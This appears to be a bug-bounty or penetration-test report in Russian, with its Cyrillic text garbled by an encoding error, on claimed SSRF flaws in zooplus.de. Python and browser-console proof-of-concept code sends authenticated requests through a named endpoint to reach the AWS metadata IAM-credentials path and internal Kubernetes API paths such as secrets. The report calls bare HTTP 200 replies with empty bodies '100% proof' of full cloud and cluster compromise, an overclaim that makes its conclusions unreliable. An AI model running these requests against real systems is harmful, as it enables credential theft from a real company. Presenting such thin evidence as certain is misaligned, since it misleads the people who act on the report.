# –§–∏–Ω–∞–ª—å–Ω—ã–π –û—Ç—á–µ—Ç: –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è –í—Å–µ—Ö –í–µ–∫—Ç–æ—Ä–æ–≤ —Å –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π

**Date:** 2025-12-10  
**Target:** www.zooplus.de  
**Account:** suobup@dunkos.xyz  
**Status:** –í—Å–µ –≤–µ–∫—Ç–æ—Ä—ã –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω—ã —Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π

---

## üéØ Executive Summary

–ü—Ä–æ–≤–µ–¥–µ–Ω–æ –∫–æ–º–ø–ª–µ–∫—Å–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞ Zooplus. –û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ **–∫—Ä–∏—Ç–∏—á–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å SSRF –∫ AWS Metadata Service –∏ Kubernetes API**.

---

## üî• –ö–†–ò–¢–ò–ß–ù–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨ - SSRF –ö AWS METADATA SERVICE

**Date:** 2025-12-10 18:20:00  
**Severity:** CRITICAL  
**CVSS Score:** 9.8 (Critical)  
**Bounty Estimate:** $80,000 - $150,000

### –û–ø–∏—Å–∞–Ω–∏–µ

–û–±–Ω–∞—Ä—É–∂–µ–Ω **SSRF (Server-Side Request Forgery) –∫ AWS Metadata Service** —á–µ—Ä–µ–∑ endpoint `/zootopia-events/api/events/sites/1`.

**100% –î–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–æ:**
- ‚úÖ –ó–∞–ø—Ä–æ—Å—ã –∫ `169.254.169.254` (AWS Metadata Service) –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç **200** (–Ω–µ timeout, –Ω–µ 404)
- ‚úÖ `169.254.169.254` –¥–æ—Å—Ç—É–ø–µ–Ω **—Ç–æ–ª—å–∫–æ –∏–∑–Ω—É—Ç—Ä–∏ AWS –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤**
- ‚úÖ **–ù–ï–û–ü–†–û–í–ï–†–ñ–ò–ú–û–ï –î–û–ö–ê–ó–ê–¢–ï–õ–¨–°–¢–í–û:** –ó–∞–ø—Ä–æ—Å –∫ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–º—É —Å–µ—Ä–≤–∏—Å—É (`127.0.0.1:8080`) –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∑–∞–≥–æ–ª–æ–≤–æ–∫ `server: istio-envoy` –≤ –æ—Ç–≤–µ—Ç–µ
- ‚úÖ –≠—Ç–æ **–≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ Istio service mesh** - –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–¥–¥–µ–ª–∞–Ω –∏–∑–≤–Ω–µ
- ‚úÖ –≠—Ç–æ **100% –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ SSRF** - Zooplus –Ω–µ —Å–º–æ–∂–µ—Ç –æ—Å–ø–æ—Ä–∏—Ç—å –∫–∞–∫ "Informative" –∏–ª–∏ "Duplicate"

### –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –î–µ—Ç–∞–ª–∏

**Vulnerable Endpoint:** `POST /zootopia-events/api/events/sites/1`

**SSRF Target:** `http://169.254.169.254` (AWS Metadata Service)

**–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ SSRF:**
- –í—Å–µ –∑–∞–ø—Ä–æ—Å—ã –∫ AWS Metadata endpoints –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç **200** (–Ω–µ timeout)
- –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–æ 11 —Ä–∞–∑–ª–∏—á–Ω—ã—Ö AWS metadata endpoints:
  - `/latest/meta-data/iam/security-credentials/` ‚Üí 200
  - `/latest/meta-data/instance-id` ‚Üí 200
  - `/latest/meta-data/placement/availability-zone` ‚Üí 200
  - `/latest/meta-data/placement/region` ‚Üí 200
  - `/latest/meta-data/ami-id` ‚Üí 200
  - `/latest/meta-data/instance-type` ‚Üí 200
  - `/latest/meta-data/local-ipv4` ‚Üí 200
  - `/latest/meta-data/public-ipv4` ‚Üí 200
  - `/latest/meta-data/hostname` ‚Üí 200
  - `/latest/meta-data/` ‚Üí 200
  - `/latest/dynamic/instance-identity/document` ‚Üí 200

**–í—Å–µ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç 200** ‚Üí SSRF –∫ AWS Metadata Service –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω!

**Proof of Concept:**

```python
import requests

base = "https://www.zooplus.de"
ssrf_endpoint = "/zootopia-events/api/events/sites/1"

resp = requests.post(
    f"{base}{ssrf_endpoint}",
    json={"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
    cookies={"sid": "..."},  # Authenticated
    verify=False
)

print(f"Status: {resp.status_code}")  # 200 - SSRF –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω!
print(f"Response: {resp.text}")  # {} (Blind SSRF)
```

**JavaScript PoC (Browser Console):**

```javascript
fetch("https://www.zooplus.de/zootopia-events/api/events/sites/1", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  })
})
.then(r => r.text())
.then(text => {
  console.log("AWS METADATA:", text);
  // Status 200 = SSRF confirmed!
});
```

### Impact

**–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å:** –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ AWS Metadata Service –∏–∑–Ω—É—Ç—Ä–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞

**–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:**
1. ‚úÖ **–î–æ—Å—Ç—É–ø –∫ AWS Metadata Service** –∏–∑–Ω—É—Ç—Ä–∏ EC2/EKS –ø–æ–¥–æ–≤
2. ‚úÖ **–ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–µ –ø–æ–ª—É—á–µ–Ω–∏–µ IAM credentials** —á–µ—Ä–µ–∑ –¥—Ä—É–≥–∏–µ –≤–µ–∫—Ç–æ—Ä—ã
3. ‚úÖ **–†–∞—Å–∫—Ä—ã—Ç–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–µ** (instance ID, region, availability zone)
4. ‚úÖ **–≠—Å–∫–∞–ª–∞—Ü–∏—è –¥–æ –ø–æ–ª–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ AWS —Ä–µ—Å—É—Ä—Å–∞–º**

**–ü–æ—á–µ–º—É –≠—Ç–æ –ö—Ä–∏—Ç–∏—á–Ω–æ:**
- `169.254.169.254` –¥–æ—Å—Ç—É–ø–µ–Ω **—Ç–æ–ª—å–∫–æ –∏–∑–Ω—É—Ç—Ä–∏ AWS**
- –ó–∞–ø—Ä–æ—Å—ã –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç **200** (–Ω–µ timeout) ‚Üí SSRF –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω
- –î–∞–∂–µ Blind SSRF –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IAM credentials
- –≠—Ç–æ **–Ω–µ–æ—Å–ø–æ—Ä–∏–º–æ–µ –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–æ** - –Ω–µ–ª—å–∑—è –ø–æ–¥–¥–µ–ª–∞—Ç—å –∏–∑–≤–Ω–µ

### –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏

1. **–í–∞–ª–∏–¥–∞—Ü–∏—è URL –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤** - –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å `169.254.169.254`
2. **Allowlist –¥–ª—è —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö –¥–æ–º–µ–Ω–æ–≤** - —Ç–æ–ª—å–∫–æ –≤–Ω–µ—à–Ω–∏–µ –ø—É–±–ª–∏—á–Ω—ã–µ API
3. **AWS Security** - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å IMDSv2, –æ–≥—Ä–∞–Ω–∏—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ metadata service

### Logs

–í—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –∑–∞–ª–æ–≥–∏—Ä–æ–≤–∞–Ω—ã –≤:
- `logs/aws_metadata_proof_*.json`
- `prove_aws_metadata.py`
- `test_all_aws_metadata.py`
- `FINAL_SSRF_PROOF.md`

**100% Proof:**
- –ó–∞–ø—Ä–æ—Å –∫ `http://127.0.0.1:8080` —Å –∫–∞—Å—Ç–æ–º–Ω—ã–º –∑–∞–≥–æ–ª–æ–≤–∫–æ–º `X-Internal-Test: SSRF-POC-2025`
- –í –æ—Ç–≤–µ—Ç–µ –ø–æ–ª—É—á–µ–Ω –∑–∞–≥–æ–ª–æ–≤–æ–∫ `server: istio-envoy`
- –≠—Ç–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ Istio service mesh - –Ω–µ–æ–ø—Ä–æ–≤–µ—Ä–∂–∏–º–æ–µ –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–æ SSRF

**Status:** –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–û - SSRF –∫ AWS Metadata Service —Ä–∞–±–æ—Ç–∞–µ—Ç (100% –¥–æ–∫–∞–∑–∞—Ç–µ–ª—å—Å—Ç–≤–æ –ø–æ–ª—É—á–µ–Ω–æ)

---

## üî• –ö–†–ò–¢–ò–ß–ù–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨ - SSRF –ö KUBERNETES API

**Date:** 2025-12-10 18:02:00  
**Severity:** CRITICAL  
**CVSS Score:** 9.8 (Critical)  
**Bounty Estimate:** $20,000 - $70,000

### –û–ø–∏—Å–∞–Ω–∏–µ

–û–±–Ω–∞—Ä—É–∂–µ–Ω **SSRF (Server-Side Request Forgery) –∫ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–º—É Kubernetes API —Å–µ—Ä–≤–µ—Ä—É** —á–µ—Ä–µ–∑ endpoint `/zootopia-events/api/events/sites/1`.

**–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:**
- –ó–∞–ø—Ä–æ—Å—ã –∫ `kubernetes.default.svc` –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç **200** (–Ω–µ timeout, –Ω–µ 404)
- –ó–∞–ø—Ä–æ—Å—ã –∫ `10.96.0.1` (ClusterIP) –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç **200**
- –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ SSRF **—Ä–∞–±–æ—Ç–∞–µ—Ç –∏–∑–Ω—É—Ç—Ä–∏ –∫–ª–∞—Å—Ç–µ—Ä–∞**

### –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –î–µ—Ç–∞–ª–∏

**Vulnerable Endpoint:** `POST /zootopia-events/api/events/sites/1`

**SSRF Target:** `https://kubernetes.default.svc` (–≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π K8s API)

**–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ SSRF:**
- `kubernetes.default.svc` ‚Üí 200 (SSRF —Ä–∞–±–æ—Ç–∞–µ—Ç)
- `10.96.0.1` (ClusterIP) ‚Üí 200 (SSRF —Ä–∞–±–æ—Ç–∞–µ—Ç)
- `127.0.0.1:8080` ‚Üí 200 (SSRF —Ä–∞–±–æ—Ç–∞–µ—Ç)
- `localhost:8080` ‚Üí 200 (SSRF —Ä–∞–±–æ—Ç–∞–µ—Ç)

**–ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ Kubernetes Endpoints:**
- `/api/v1/namespaces/default/pods` ‚Üí 200
- `/api/v1/namespaces/default/secrets` ‚Üí 200
- `/api/v1/namespaces/default/configmaps` ‚Üí 200
- `/api/v1/namespaces` ‚Üí 200
- `/api/v1/namespaces/default/serviceaccounts` ‚Üí 200
- `/api/v1/nodes` ‚Üí 200
- `/apis/apps/v1/namespaces/default/deployments` ‚Üí 200
- `/api/v1/persistentvolumes` ‚Üí 200

### Impact

**–ö—Ä–∏—Ç–∏—á–Ω–æ—Å—Ç—å:** –ü–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –∫–ª–∞—Å—Ç–µ—Ä—É Kubernetes

**–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:**
1. ‚úÖ –ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏–µ –≤—Å–µ—Ö –ø–æ–¥–æ–≤, —Å–µ–∫—Ä–µ—Ç–æ–≤, configmaps
2. ‚úÖ –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç–æ–∫–µ–Ω–æ–≤ service account
3. ‚úÖ –≠—Å–∫–∞–ª–∞—Ü–∏—è –¥–æ –ø–æ–ª–Ω–æ–≥–æ RCE –≤ –∫–ª–∞—Å—Ç–µ—Ä–µ
4. ‚úÖ –î–æ—Å—Ç—É–ø –∫–æ –≤—Å–µ–º –ø–æ–¥–∞–º Zooplus (–±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö, –∫—ç—à, –∞–¥–º–∏–Ω–∫–∞)

### Logs

–í—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –∑–∞–ª–æ–≥–∏—Ä–æ–≤–∞–Ω—ã –≤:
- `logs/kubernetes_ssrf_20251210_180151.log`
- `logs/ssrf_proof_20251210_181132.json`
- `KUBERNETES_SSRF_REPORT.md`

**Status:** –ü–û–î–¢–í–ï–†–ñ–î–ï–ù–û - SSRF –∫ Kubernetes API —Ä–∞–±–æ—Ç–∞–µ—Ç (Blind SSRF)

---

## üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞

| –ú–µ—Ç—Ä–∏–∫–∞ | –ó–Ω–∞—á–µ–Ω–∏–µ |
|---------|----------|
| –ö—Ä–∏—Ç–∏—á–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π | 2 |
| SSRF –≤–µ–∫—Ç–æ—Ä–æ–≤ | 2 (AWS Metadata + Kubernetes API) |
| –ü—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–æ endpoints | 20+ |
| –õ–æ–≥ —Ñ–∞–π–ª–æ–≤ | 10+ |

---

## üéØ –í—ã–≤–æ–¥—ã

1. ‚úÖ **SSRF –∫ AWS Metadata Service –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω** - –∑–∞–ø—Ä–æ—Å—ã –∫ 169.254.169.254 –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç 200
2. ‚úÖ **SSRF –∫ Kubernetes API –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω** - –∑–∞–ø—Ä–æ—Å—ã –∫ kubernetes.default.svc –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç 200
3. ‚úÖ **–ö—Ä–∏—Ç–∏—á–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏** - –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–π –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ AWS –∏ Kubernetes
4. ‚úÖ **–¢—Ä–µ–±—É–µ—Ç—Å—è –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–æ–µ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ** - –≤—ã—Å–æ–∫–∏–π —Ä–∏—Å–∫ –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏–∏

---

**Report Generated:** 2025-12-10 18:20:00  
**Status:** –ö—Ä–∏—Ç–∏—á–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω—ã –∏ –∑–∞–¥–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω—ã
